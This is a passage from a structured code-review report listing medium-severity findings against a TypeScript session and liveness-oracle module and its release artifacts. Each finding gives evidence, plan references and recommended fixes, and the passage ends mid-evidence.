- **Recommended action:** Add a `pnpm check:invention-reachability && pnpm check:changelog-closes` step to .github/workflows/architecture-guards.yml (the workflow whose subject this already is), and assert its presence in tooling-gates-cli.test.ts the same way gap F59 already asserts membership in `check:all` (crossval-4-6-closure.test.ts:241).


## MEDIUM findings (35)

### F-arch-9: `firstLine` carries no cost contract and no shipped adapter, so the module's "costs one line of one file" claim is unenforceable and the budget counts a possibly-whole-file read as one operation.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 43
- **Plan reference:** ADR D5; T3.2 "Deep Dives — the shared budget"
- **Evidence:**

  ```ts
  // liveness-oracle.ts:42-43
  /** The first line of `file`. The transcript's first record carries the `cwd` it was written in. */
  firstLine: (file: string) => string
  ```
  and the module's premise, :113-114: "reading it costs one line of one file".
  The consumer's implementation — the one this was absorbed from — is a bounded read, deliberately:
  ```ts
  // TheoCode/packages/agent/src/session/gc/filesystem.ts:49-60
  firstLine(file) {
    const fd = openSync(file, 'r')
    try { const buf = Buffer.alloc(FIRST_LINE_CAP)
          const bytesRead = readSync(fd, buf, 0, FIRST_LINE_CAP, 0) ... }
    finally { closeSync(fd) }
  }
  ```
  The obvious adapter a consumer writes instead is `readFileSync(f,'utf8').split('\n')[0]`, which
  loads an entire session transcript into memory — for up to 3 files per project across 13 624
  projects in the measured tree. The budget (`remaining -= 1`, :170) prices that identically to a
  `statSync`. Same class as previous-review F-arch-15 (`fs` required with no shipped adapter),
  now with three methods instead of one and one of them performance-critical.
  On the ISP question specifically: `FsSeam` at three methods is still ROLE-shaped, not
  header-shaped — every implementer supplies and every call site exercises all three, and no
  consumer is forced to stub one out. The defect is the missing adapter and the missing cost
  contract, not the arity.

- **Recommended action:** Ship `nodeFsSeam(): FsSeam` from `@theokit/agents/session` implementing all three methods (bounded first-line read, ENOENT-only absence per F-arch-3), and state the read cap in the `firstLine` doc so a hand-written adapter has a contract to meet.

### F-arch-10: The shared budget bounds only `FsSeam` calls; `candidatePaths()` — the product enumeration that IS the expensive half — is entirely outside the accounting and is invoked even after the budget is spent.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 188
- **Plan reference:** T3.2 "Invariant. The DFS budget is shared across the whole sweep"; ADR D4 (the 64M-syscall figure)
- **Evidence:**

  ```ts
  // liveness-oracle.ts:188-200 — no `remaining` accounting anywhere in enumerate()
  const enumerate = (): readonly string[] => {
    if (candidates === undefined && enumerationError === undefined) {
      try { candidates = opts.candidatePaths() } catch (error) { ... }
    }
    return candidates ?? []
  }
  // :280-286 — called before searchPool's budget guard can refuse
  const pool = enumerate()
  out.set(name, enumerationError === undefined ? searchPool(name, pool) : ...)
  ```
  In the consumer the equivalent work is `dfsExists`, budgeted at `MAX_DFS_NODES * 10` nodes
  precisely because it is where the ~64M syscalls lived
  (`TheoCode/packages/agent/src/session/gc/filesystem.ts:35-45`). A framework budget that bounds
  the probes and not the enumeration bounds the cheap half of the cost it was built to bound.
  Related, and already filed by the branch itself
  (`.claude/knowledge-base/backlog.md:1156`, `.wiring-evidence.json:36`): an undersized budget
  degrades silently — a first run at 20 000 turned 7 967 projects into `undetermined` and the
  caller sees a complete Map with no aggregate signal that the sweep did nothing.

- **Recommended action:** Either document `budget` honestly as "probes performed by this module; the cost of `candidatePaths()` is the caller's", or accept a `budget` the enumerator can decrement too (pass the remaining count into `candidatePaths(remaining)`). Separately, surface the exhaustion the backlog item names — e.g. return a sweep-level `{ budgetExhausted: true }` alongside the Map so a GC can refuse to act on a starved run.

### F-arch-11: `RecordedCwd` is the right KIND of shape and does not leak (private type, switched at one site), but it is under-discriminated: the step has four outcomes and the union carries three — budget exhaustion is folded into `absent`, which is the exact collapse the union's own docstring forbids.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 169
- **Plan reference:** 7fea1388 commit body ("recordedCwd devolve uma uniao discriminada ... colapsar dois perde a distincao")
- **Evidence:**

  ```ts
  // liveness-oracle.ts:92-95
  type RecordedCwd =
    | { readonly kind: 'found'; readonly cwd: string }
    | { readonly kind: 'absent' }
    | { readonly kind: 'unreadable'; readonly error: string }
  // :86-90 — "collapsing any two loses the distinction the module exists to keep"
  // :169 — the collapse
  if (remaining <= 0) return { kind: 'absent' }
  ```
  `absent` therefore means both "no transcript answered" (a fact about the project) and "I ran
  out of budget mid-read" (a fact about the sweep) — the same absent/cannot-tell conflation the
  module exists to avoid, one layer down. The end verdict happens to be correct because
  `searchPool` re-checks the budget at :214, but only via a second, unrelated guard: the caller
  still pays an `enumerate()` (F-arch-10) on a sweep that has nothing left to spend.
  To answer the review question directly: the union does NOT leak an implementation concern into
  the sweep — it is private, and the sweep switches on `kind` exactly once (:252-278). Its shape
  is right and its arity is one short.

- **Recommended action:** Add a fourth variant `{ kind: 'exhausted' }` and map it directly to `{ liveness: 'undetermined', reason: 'search budget exhausted' }` in the sweep, before `enumerate()` is reached.

### F-arch-12: STILL OPEN, and 7fea1388 widened the gap: the oracle's published signature changed and the discoverability artifact this plan exists to fix still has no row for it.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `wiki/capability-index.md` line 58
- **Plan reference:** T3.2 Tasks item 6 ("Add the capability-index row"); previous review F-dom-3 (re-check)
- **Evidence:**

  ```
  $ grep -n "classifyProjects\|liveness" wiki/capability-index.md
  (no output)
  ```
  The `@theokit/agents/session` block (`:58-61`) lists `runTranscriptGC`, `GCFloorError`,
  `GCCandidate`, `protectedTranscripts` and stops. Missing across the branch's framework output:
  `classifyProjects`, `shouldAutoApprove`, `WRITE_SCOPED_TOOLS`, `transcriptRootHint`,
  `expandCommandTemplate`, `SessionRegistryRemoverError`. The plan's own Goal is that "a developer
  ... can reach every capability the ecosystem ships"; the slice's framework-side additions are
  unreachable through the map the slice wrote.

- **Recommended action:** Add the rows (with the `Landed` column set to the major this ships as, per the changeset) in the same commit as the signature change, and let `crossval-gaps.test.ts`'s declared-export guard validate them.

### F-arch-13: The projects-directory path is built by string concatenation here and by `join(projectsRoot(root), encodeProjectDir(cwd))` one file away — a third representation of the same on-disk layout rule, and non-portable.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 156
- **Plan reference:** rules/architecture.md § 3 (one owner per question); G12
- **Evidence:**

  ```ts
  // liveness-oracle.ts:156
  const dir = `${opts.projectsRoot}/${name}`
  // :256
  reason: `could not read ${opts.projectsRoot}/${name}: ${recorded.error}`
  ```
  versus the owner of the same layout, in the same directory:
  ```ts
  // packages/agents/src/session/project-index.ts:58-63
  export function projectsRoot(root: string = transcriptRoot()): string { ... }
  export function projectDirFor(cwd: string, root?: string): string {
    return join(projectsRoot(root), encodeProjectDir(cwd))
  }
  ```
  The doc at :57-59 even tells the caller to use `projectsRoot()` "rather than joining the segment
  by hand — that segment had three owners once" while the module then joins by hand itself. A
  `\` separator on Windows makes the two disagree.

- **Recommended action:** Import `join` from `node:path` (the module already runs in Node — the fs is injected for budgeting, not for portability) or take `projectDirFor`-style path construction as part of the seam. Either way, one function should build this path.

### F-arch-14: STILL OPEN. Neither tui component was rewired to the new models, so the package continues to ship two sources of truth for each capability and the new one still has zero in-package consumer.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `../theokit-tui/src/keyboard-help.tsx` line 32
- **Plan reference:** previous review F-wire-6 (re-check); ADR D6 ("two doors, one room")
- **Evidence:**

  ```
  $ grep -rn "toolPresentation|DEFAULT_TOOL_PRESENTATION|keyboardHelpModel|DEFAULT_COMPOSER_SHORTCUTS" src \
      | grep -v "^src/tool-presentation|^src/keyboard-help-model"
  src/keyboard-help.tsx:32:export const DEFAULT_COMPOSER_SHORTCUTS: readonly KeyboardShortcut[] = [
  src/index.ts:70,72,259: (barrel re-exports only)
  src/keyboard-help.test.tsx:35: <KeyboardHelp shortcuts={DEFAULT_COMPOSER_SHORTCUTS} />
  ```
  No component consumes `toolPresentation`; `KeyboardHelp` still hardcodes its shortcut list.
  This is why F-dom-7 (the `header(input, active: boolean)` shape cannot express `failed`) was
  never surfaced — the model has still never been driven by the component it was written for.

- **Recommended action:** Wire one component per model (`ToolCall` accepting `presentation?: ReadonlyMap<string, ToolPresentation>`; `KeyboardHelp` deriving from `keyboardHelpModel`), or state in the changelog that the models ship ahead of their adopters.

### F-xval-8: Both allowlist entries carry sunset 2026-11-14, not the 2026-11-13 the ADR and the Acceptance Criterion name. 2026-08-15 + 90 days = 2026-11-13; 2026-11-14 is 91.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.claude/rules/invention-reachability-allowlist.txt:22-23`
- **Plan reference:** ADR D8 — 'a sunset of 2026-11-13 (90 days from the plan date — EC-7 corrected 2026-11-15, which was 92)'; T4.1 § Acceptance Criteria item 2 — 'the file contains the sunset date 2026-11-13'
- **Evidence:**

  ApprovalPosture | 2026-11-14 | ...
  LoopStrategy    | 2026-11-14 | ...
  $ grep -n "2026-11-13" .claude/rules/invention-reachability-allowlist.txt scripts/check-invention-reachability.mjs
  (no matches)
  
  The other half of the AC holds:
  $ node scripts/check-invention-reachability.mjs; echo $?   ->  0   (warn mode)
  $ grep -n check:invention-reachability package.json         ->  wired into check:all at :33
  
  This is small in absolute terms and one day over a 90-day ceiling, but the ceiling is a LOCKED
  constraint (code-quality-golden-rule.md § 4) and the date was itself a v1.2 MUST-FIX (EC-7)
  raised precisely because the first draft was two days over. Landing one day over reproduces
  the class of error the edge-case review corrected.

- **Recommended action:** Change both entries to 2026-11-13 to match ADR D8, or amend D8 with the measured-from date if the intent was 90 days from the implement run rather than from the plan.

### F-xval-9: Two of the three required index sections shipped. `theokit/server` has none.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `wiki/capability-index.md`
- **Plan reference:** T4.2 § Acceptance Criteria item 4 — 'The index has sections for @theokit/tui, theokit/server and the decided SDK subpaths'; Coverage Matrix row F60
- **Evidence:**

  $ grep -n '^## ' wiki/capability-index.md
  ## How to read a row
  ## Agent runtime and composition
  ## Tools, scope and sandbox
  ## Credentials and trust
  ## Sessions
  ## Human in the loop
  ## Errors
  ## Terminal surfaces — `@theokit/tui`      <- shipped
  ## Runtime surfaces reached through the SDK — `@theokit/sdk`   <- shipped
  ## Honest gaps
  ## Keeping this page true
  $ grep -n "theokit/server" wiki/capability-index.md
  109:| Authorize against a remote MCP server (OAuth PKCE) | ... |    <- prose, not a section
  
  The CHANGELOG entry for T4.2 is accurate about what shipped — "Entraram seções para
  `@theokit/tui` e `@theokit/sdk`" — it names two, and the AC asks for three. The finding is that
  the AC is unmet, not that the CHANGELOG overclaims.
  
  Coverage Matrix row F60 ("Capability index answers for 1 package of the published ecosystem",
  severity **high**) maps to T4.2 and T5.4. T5.4 is blocked, so the row is not fully resolved by
  the branch either way.

- **Recommended action:** Add the `theokit/server` section (the guard generalisation from T4.2 already resolves rows per the Import-from column, so the section can be added without further guard work), or narrow the AC and the F60 row to the two packages with a written reason.

### F-xval-10: Both refusals throw the generic `TheokitAgentError`. The two distinct classes the plan names — and that EC-5 exists to keep distinguishable — were never created.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `packages/agents/src/session/session-lifecycle.ts:296,317`
- **Plan reference:** T2.3 § Tasks step 4 ('Add the typed ReachableTurnsExceededError extending TheokitAgentError'), § Pseudo-code (InvalidTurnOrdinalError / ReachableTurnsExceededError), § Acceptance Criteria item 3
- **Evidence:**

  :296  throw new TheokitAgentError(`forkBeforeUserTurn: \`nth\` counts user turns from 1, ...`)
  :317  throw new TheokitAgentError(`forkBeforeUserTurn: session "..." has N reachable user turn(s) ...`)
  $ grep -n "ReachableTurnsExceeded\|InvalidTurnOrdinal" packages/agents/src/session/session-lifecycle.ts
  (no matches)
  
  What EC-5 asked for IS satisfied at the message level: the two messages are different and the
  reachable count appears in the second, so a human reading a log can tell them apart, and
  test_nth_below_one_raises_a_distinct_typed_error / test_nth_beyond_reachable_turns_names_the_reachable_count
  both pass. What is lost is programmatic discrimination: a consumer's `catch` cannot branch on
  the class, which is the guarantee `rules/error-handling.md § 2` asks for ("Errors are explicit
  and typed ... use domain errors").
  
  Commit 346d28c5 addresses only the first half: "A recusa de nth < 1 ja era distinta da de
  excedente antes desta tarefa — a EC-5 ja estava coberta ali". True of the message; silent about
  the two classes the plan's Tasks step 4 asked for.
  
  Related, smaller: 4 of T2.3's 11 declared RED tests are absent — the two preview tests
  (F-xval-4), counting_starts_after_the_LAST_boundary_when_several_are_present and
  test_boundary_as_the_final_record_names_zero_reachable_turns (both EC-14). The lastIndexOf
  implementation at :387-393 is correct; it is the EC-14 regression tests that were not written.

- **Recommended action:** Add the two error classes (or record an ADR choosing message-level distinction over class-level, naming the consumer cost), and add the two EC-14 tests, which cost little and pin behaviour the plan called out explicitly.

### F-xval-11: The implementation contract's per-task table still reads `pending` for all 23 tasks, with every wiring pillar `—` and every commit SHA `—`, after 12 tasks were committed.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.claude/knowledge-base/implementations/crossval-4-6-absorption-implementation.md`
- **Plan reference:** cycle-implement.md § Output — 'knowledge-base/implementations/{slug}-implementation.md — final summary with wiring triad checklist per task'
- **Evidence:**

  The table under "## Task list (derived from plan; ordered by the plan's Dependency Graph)"
  shows, for T0.1 through T5.4:
    | T0.1 | Phase 0 / T0.1 | pending | — | — | — | — |
  ... identical for all 23 rows.
  The real state lives only in .progress-crossval-4-6-absorption.json, and the two disagree.
  
  This matters because f838333d's own commit message contains the correct lesson:
  "o relatorio inicial desta sessao se apoiou no `.progress` em vez do historico do repositorio
   ... Checkpoint e alegacao; git log e fato."
  The same commit rewrote 260 lines of this file and still left the table at `pending` — the
  artifact a reviewer opens first is the one that was not updated.

- **Recommended action:** Fill the table from `git log` (not from `.progress`), marking the 6 blocked tasks `blocked` with their reason, and record per-task wiring pillars.

### F-xval-12: The prepared remediation for T1.2 cannot reach this repo even after publish: the pin is `^0.26.1` and the fix ships in 0.27.0, which a 0.x caret range excludes.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `packages/agents/package.json (dependencies."@theokit/sdk-tools")`
- **Plan reference:** T1.2 § blocked_reason in the progress checkpoint; Coverage Matrix gap 15; T5.0 § publish checkpoint
- **Evidence:**

  packages/agents/package.json: "@theokit/sdk-tools": "^0.26.1"
  Installed:  node_modules/.pnpm/@theokit+sdk-tools@0.26.1_...
  Sibling:    ../theokit-sdk c743b5850 "chore(sdk-tools): 0.27.0 — a versao que finalmente
              carrega createViewImageTool"
  Under npm semver, `^0.26.1` resolves `>=0.26.1 <0.27.0`. Publishing 0.27.0 does not satisfy it.
  
  The checkpoint's T1.2 blocked_reason is otherwise an unusually good piece of work — it records
  that the gap was mis-diagnosed ("A lacuna 15 diagnosticou a causa errada, do mesmo jeito que a
  16"), names the measurement (each tarball fetched and its d.ts grepped), and refuses to release
  from workspace. This finding only adds the step that reason does not mention.

- **Recommended action:** Add the dependency-range bump to T5.0's checklist so the publish checkpoint verifies the consumer range as well as the registry version — the plan's own EC-6 ("verifying the expected published version rather than that a version resolves") is the same lesson one level up.

### F-dom-9: Assessment asked for — `candidatePaths` is a better NAME and does not prevent the collision it was renamed to fix. Both sides of the confusion are still `string[]`, so the compiler still cannot tell an encoded directory name from a real absolute path, and the swap that produced the 6-of-6 misclassification remains representable.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 74
- **Plan reference:** commit 7fea1388; plan T3.2 Deep Dives ("The type must make the third state unrepresentable-as-dead")
- **Domain anchor:** rules/type-safety.md § Required Patterns (discriminated unions; make illegal states unrepresentable)
- **Evidence:**

  ```ts
  // liveness-oracle.ts:121-124
  export function classifyProjects(
    encoded: readonly string[],           // ENCODED NAMES, positional
    opts: ClassifyProjectsOptions,        // .candidatePaths(): readonly string[]  — REAL PATHS (:74)
  ): Map<string, LivenessVerdict>
  ```
  The measured defect (`liveness-oracle.ts:63-68`) was that the consumer's producer returned
  encoded names and this module read them as paths. After the rename, a consumer that wires the
  SAME producer to `candidatePaths` still compiles cleanly and still gets the same wrong answer;
  only the prose warns them. The failure is silent and one-directional — every project falls
  through to `searchPool`, which since this commit can only return `undetermined`, so the
  symptom moved from "deletes live projects" to "the oracle answers nothing" and no test or type
  notices.
  The plan applied the opposite standard to the OUTPUT of the same function — T3.2 Deep Dives
  (plan:1394): "The type must make the third state unrepresentable-as-dead", which the
  three-valued `Liveness` union honours. The input got a docstring instead.
  Two structural asymmetries also remain unexplained in the type: `encoded` is a plain array
  while `candidatePaths` is a thunk (the laziness rationale lives in a body comment at :142-143,
  not in the JSDoc a consumer reads), and only one of the two is in the options bag.

- **Recommended action:** Make the swap unrepresentable rather than discouraged: a branded alias (`type EncodedProjectDir = string & { readonly __encoded: unique symbol }`) applied to the positional parameter and to the `Map` key, with the sole producer being the package's own `encodeProjectDir`. A consumer then cannot hand encoded names to `candidatePaths` without an explicit cast that a reviewer sees. If branding is judged too heavy, at minimum move the "resolved ONCE for the sweep" rationale from the body comment into the `candidatePaths` JSDoc, so the thunk's contract is visible in `session.d.ts`.

### F-dom-10: Coverage check requested. The two pending majors cover the two async widenings and the error class correctly. But one of them declares a BREAKING migration for a symbol NO published version exposes, and one genuinely user-visible fix in a second package has no changeset at all.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `.changeset/liveness-oracle-recorded-cwd-major.md` line 5
- **Plan reference:** Global DoD ("every signature change is a widening; no export removed"); rules/cycle-release.md § Bump-level derivation
- **Domain anchor:** Unbreakable Rule 6 — a changelog entry is a statement about what a consumer must DO
- **Evidence:**

  Over-declared. `.changeset/liveness-oracle-recorded-cwd-major.md:1-6` is `"@theokit/agents": major`
  and opens with "BREAKING: `classifyProjects` ... `listProjects` renamed to `candidatePaths`",
  closing with "Migration: rename the option to `candidatePaths` ...". Measured against the
  published surface:
    `npm pack @theokit/agents@9.4.0` -> `package/dist/session.d.ts:286` export list contains NO
    `classifyProjects`, `ClassifyProjectsOptions`, `FsSeam`, `Liveness`, `LivenessVerdict` or
    `transcriptRootHint`.
  The symbol was introduced AFTER the publish checkpoint (c3527883, post-3d55d34f) and reshaped
  before it ever shipped. A consumer on `^9.4.0` reading 10.0.0's "Major Changes" is instructed
  to rename an option they never had, in the section they read most carefully. Correct shape:
  an `Added` note describing the final API. The major is already forced by the sibling
  changeset, so nothing is lost by stating it accurately.
  
  Under-declared. `packages/theo` (published as `theokit`, version 0.48.2) has an unreleased,
  user-visible CLI fix with no changeset:
    commit 0aba5959 `fix(cli)!: sessions gc called an async function without await` ->
    `packages/theo/src/cli/commands/sessions-gc.ts` (`git diff 3d55d34f..HEAD --stat` lists it;
    `packages/theo/package.json` is NOT in that diff, so 0.48.2 is still the released version).
  `ls .changeset/` -> only the two `@theokit/agents` majors. With
  `"updateInternalDependencies": "patch"` (`.changeset/config.json`) and
  `"@theokit/agents": "workspace:^"` (`packages/theo/package.json:116`), changesets WILL bump
  `theokit` — as a dependent, with a "Updated dependencies" line. So the package CHANGELOG that
  a CLI user actually reads will not say that `theokit agent sessions gc` crashed before printing
  anything, or that it now works.
  
  Everything else post-3d55d34f is additive and needs no major: `applyPosture` as a value
  (`bridge/index.ts`), `shouldAutoApprove`/`APPROVAL_MODES`/`WRITE_SCOPED_TOOLS`,
  `expandCommandTemplate`/`templateHints`/`FILE_INLINE_CAP`, `transcriptRootHint`, and the
  `PendingItem<TPayload = undefined>` type parameter (`ask/pending-ledger.ts:26`, defaulted so
  existing `PendingItem` annotations still resolve). None of them appears in any changeset either,
  so 10.0.0's "Minor Changes" will be empty while nine new exports ship — which is the same
  discoverability failure as F-dom-3, one artifact over.

- **Recommended action:** (a) Rewrite the liveness changeset as an `Added` entry describing the final shape of `classifyProjects` (keeping the 6-of-6 measurement, which is the useful part) and drop the "rename the option" migration line. (b) Add a `"theokit": patch` changeset naming the `sessions gc` runtime failure in consumer language. (c) Add a `"@theokit/agents": minor` changeset listing the nine new exports, so the release notes and the capability index can be populated from one source.

### F-dom-11: The registry wait changed from "forever" to 30 s and the escape hatch is a magic non-finite value, and neither fact appears anywhere on the published surface. The constant the changeset names by symbol is not exported from any subpath, so a consumer cannot import what they were told to use.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/session-lifecycle.ts` line 203
- **Plan reference:** T2.2; commit 90e9af57 ("the GC bound was opt-in and nothing opted in")
- **Domain anchor:** Unbreakable Rule 6 + explicit public-API contracts — the `.d.ts` is what a consumer reads, not the changeset
- **Evidence:**

  Published option JSDoc, unchanged by the fix (`session-lifecycle.ts:203-207`):
  ```ts
  /**
   * Ceiling on the injected remover. A registry that never answers must not hang a sweep; the
   * timeout surfaces as `registryError` and the transcript is left alone.
   */
  readonly registryTimeoutMs?: number
  ```
  No default stated, no escape hatch stated. The behaviour it documents is decided elsewhere:
    `session/gc/registry-remover.ts:55`  `export const DEFAULT_REGISTRY_TIMEOUT_MS = 30_000`
    `session/gc/registry-remover.ts:79`  `timeoutMs: number | undefined = DEFAULT_REGISTRY_TIMEOUT_MS`
    `session/gc/registry-remover.ts:88`  `if (!isThenable(outcome) || !Number.isFinite(timeoutMs)) return outcome`
  i.e. unbounded is reachable only by passing `Infinity`, an undocumented magic value on a
  published option.
  And the symbol is unreachable: `packages/agents/src/session/index.ts` (whole file) re-exports
  nothing from `gc/registry-remover.js` — only `gc/transcript-gc.js` at :30-41. So
  `DEFAULT_REGISTRY_TIMEOUT_MS`, named in `.changeset/session-lifecycle-async-major.md:24-25`
  and in `CHANGELOG.md:112-118` as the thing a consumer should know about, cannot be imported.
  This is the plan's own failure mode applied to its own output: the changeset points at a
  symbol, and the symbol has no door (`system-design-guardrails.md § G7` in reverse).
  A consumer who relied on unbounded waiting (a slow remote registry) gets a behaviour change
  whose only disclosure is changeset prose.

- **Recommended action:** Put the contract in the JSDoc of BOTH published options (`DeleteSessionOptions.registryTimeoutMs` and the `runTranscriptGC` options bag): the 30 s default, that the timeout leaves the transcript on disk, and that `Infinity` restores unbounded. Export `DEFAULT_REGISTRY_TIMEOUT_MS` from `./session` so the constant the release notes cite is importable — or stop citing it.

### F-dom-12: Still open from the previous review (was MEDIUM) and now compounded — the 7fea1388 rewrite was the natural moment to add validation and instead added a SECOND unvalidated numeric option whose negative value LOOSENS the bound it names.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 76
- **Plan reference:** T3.2 Deep Dives — "Total filesystem operations ≤ the configured budget, asserted at fixture scale and true at any scale"
- **Domain anchor:** rules/error-handling.md § 2 (validate at the boundary; reject invalid input before processing); options-validation parity with the sibling entry point in the same package
- **Evidence:**

  `liveness-oracle.ts:76` `budget: number` — used at :126 `let remaining = opts.budget`, guarded
  only by `remaining <= 0` (:158-…, :201, :239). `NaN <= 0` is false and `NaN - 1` is NaN, so a
  non-finite budget makes every guard dead and the sweep runs the full candidate pool for every
  project — the 64M-syscall behaviour the module exists to prevent, silently. The realistic path
  is a CLI or config doing `Number(process.env.X)` / `Number(argv.budget)`, NaN on a typo.
  
  New in this commit — `liveness-oracle.ts:79` `transcriptSamples?: number`, consumed at :168-169:
  ```ts
  const samples = opts.transcriptSamples ?? DEFAULT_TRANSCRIPT_SAMPLES
  for (const file of entries.filter((f) => f.endsWith('.jsonl')).slice(0, samples)) {
  ```
  `slice(0, -1)` yields ALL BUT THE LAST entry. So `transcriptSamples: -1` — the shape a caller
  reaches for to mean "no sampling" or that arrives from an off-by-one — reads MORE transcripts
  than the default 3, on an option documented as "How many transcripts to read per project
  before giving up". `NaN` and `0` both yield `[]`, silently disabling the module's primary
  resolution path (the one measured at 91/120) and pushing every project into the search
  fallback, which since this commit can never return `dead`.
  
  The sibling entry point in the same package validates: `session/gc/transcript-gc.ts` refuses
  with `!Number.isFinite(options.keepLast)`. Two GC-adjacent published entry points therefore
  disagree on whether a nonsense number is refused or honoured.

- **Recommended action:** Refuse at the boundary, matching `planTranscriptGC`'s existing shape and error type: `budget` must be a finite integer ≥ 1; `transcriptSamples`, when present, a finite integer ≥ 0. A typed refusal is one line and turns two silent misbehaviours into a message.

### F-dom-4: The fix landed in the helper and in `deleteSession`'s option doc, but the SWEEP's own option doc was not updated and now states the OPPOSITE of what the code does. It tells the reader that an absent `registryTimeoutMs` means "wait indefinitely — the pre-existing behaviour", which is precisely the behaviour 90e9af57 removed. This text is emitted into the published `packages/agents/dist/session.d.ts:345`, so it is the tooltip a consumer reads at the call site.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/gc/transcript-gc.ts` line 257
- **Plan reference:** T2.2 — the shared awaiting helper; previous review F-dom-3 recommended action ("correct the docstring so it stops asserting a guarantee the default does not provide")
- **Domain anchor:** rules/error-handling.md § 2 — a contract that disagrees with the code is a silent failure mode; CLAUDE.md G10 (honest enforcement)
- **Evidence:**

  ```ts
  // packages/agents/src/session/gc/transcript-gc.ts:257-262  — STALE
  /**
   * How long to wait for the registry per session before giving up on it and keeping the
   * transcript. Absent means wait indefinitely — the pre-existing behaviour, kept as the default
   * so adding the bound cannot change what a current caller experiences.
   */
  readonly registryTimeoutMs?: number
  ```
  versus the code it documents (registry-remover.ts:79) and versus the sibling doc on the same
  option, which was updated: session-lifecycle.ts:203-207 ("A registry that never answers must
  not hang a sweep"). Two docstrings on one option, contradicting each other on the only case
  that matters — the absent one. Shipped: `packages/agents/dist/session.d.ts:345` carries the
  stale sentence.

- **Recommended action:** Replace :257-262 with the real contract: absent resolves to `DEFAULT_REGISTRY_TIMEOUT_MS` (30s); unbounded requires an explicit non-finite value. Reference the exported constant by name so the number cannot drift from the doc.


### F-dom-5: `NaN` is a non-finite value, so a garbled timeout silently selects the unbounded path — the exact hang 90e9af57 closed, reachable by a typo instead of by a decision. The guard tests `!Number.isFinite(timeoutMs)` and treats every non-finite value as "the caller asked for unbounded", but only `Infinity` is an ask; `NaN` is a parse failure.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/gc/registry-remover.ts` line 81
- **Plan reference:** T2.2 — the shared awaiting helper; sibling validation precedent at transcript-gc.ts:164-169
- **Domain anchor:** rules/error-handling.md § 2 (validate inputs at the boundary); registry-remover.ts:69-71 — "Unbounded ... has to be ASKED FOR"
- **Evidence:**

  ```ts
  // registry-remover.ts:79-81
  timeoutMs: number | undefined = DEFAULT_REGISTRY_TIMEOUT_MS,
  ): Promise<unknown> {
    if (!isThenable(outcome) || !Number.isFinite(timeoutMs)) return outcome
  ```
  `gc-registry-remover.test.ts:308` ("test_a_non_finite_timeout_opts_out_and_waits") passes
  `Number.POSITIVE_INFINITY` only. No test passes `NaN`, and none passes `0` or a negative value
  (which take the opposite branch and reject on the next macrotask, so a sweep configured with
  `-1` collects nothing and errors on every candidate).
  This is the same defect class the previous review filed against `budget` (F-dom-4, liveness-oracle),
  which is also still open — see F-dom-9.

- **Recommended action:** Discriminate the ask from the accident: accept `Infinity` explicitly (`timeoutMs === Number.POSITIVE_INFINITY`) as the unbounded opt-out, and refuse anything else that is not a positive finite number with a typed error naming the received value. Add `test_a_NaN_timeout_is_refused_not_treated_as_unbounded()` and `test_a_non_positive_timeout_is_refused()`.


### F-dom-7: Answering the question posed: yes — classification and deletion can observe different states, and the module says nothing about it. `classifyProjects` is synchronous, so its Map is a point-in-time snapshot of the whole sweep; the deletion that consumes it is asynchronous (the remover this slice made awaitable). Every verdict except the first is therefore consumed after an arbitrary number of awaits. Unlike `transcript-gc.ts`, which at least declares invariant 4 and attempts a re-check, this module offers no re-validation contract, no re-check helper, and no caveat in a docblock that otherwise reasons carefully about the fail-safe direction.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 121
- **Plan reference:** T3.2 — classification absorbed into the framework; T2.2 — the deletion path is now async
- **Domain anchor:** liveness-oracle.ts:25-28 — "Callers DELETE on `dead`"; transcript-gc.ts:34-36 invariant 4 (the sibling module DOES state that a plan is a snapshot)
- **Evidence:**

  `classifyProjects` returns `Map<string, LivenessVerdict>` (:121-124) with no timestamp, no
  re-validation entry point, and no statement that the verdict is perishable. The docblock's
  safety reasoning (:25-32) is entirely about the classification's own fail-safe direction and
  says nothing about the interval between the verdict and the act.
  Contrast with the sibling in the same slice: transcript-gc.ts:34-36 names the snapshot problem
  explicitly ("A plan is a snapshot, and between snapshot and delete a user can resume a session.
  A collector that trusts its own plan deletes the session someone just returned to").
  No in-repo consumer exists yet, so this is a contract gap rather than a live defect —
  but the only documented use of the symbol is the one that deletes.

- **Recommended action:** Export a narrow re-validation helper — e.g. `confirmDead(name, verdict, opts): boolean` that re-probes the recorded cwd carried on the verdict — and carry the recorded cwd on the verdict so re-probing does not cost a second directory listing. At minimum, state in the docblock that a verdict is a snapshot and MUST be re-confirmed immediately before an irreversible act, the way transcript-gc.ts states invariant 4.


### F-dom-8: Answering the question posed: the 13 624-project / 2,51-ops-per-project sweep is evidence about the CLASSIFIER and about nothing else. It exercised no deletion, no registry remover, and no await — so it says nothing about the deletion path, and in particular nothing about any finding above. The file's own `honest_limits` are accurate as far as they go; what they omit is that the measured configuration excludes the entire async half of the slice.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `.wiring-evidence.json` line 16
- **Plan reference:** Global DoD — "the liveness oracle's classification equivalence observed on the operator's real project tree"; review F-wire-2 (pillar (c) was 0/27)
- **Domain anchor:** cycle-implement.md § wiring triad, pillar (c) runtime metric; rules/testing.md § 4.1 (a measurement that never exercised the path proves nothing about it)
- **Evidence:**

  ```json
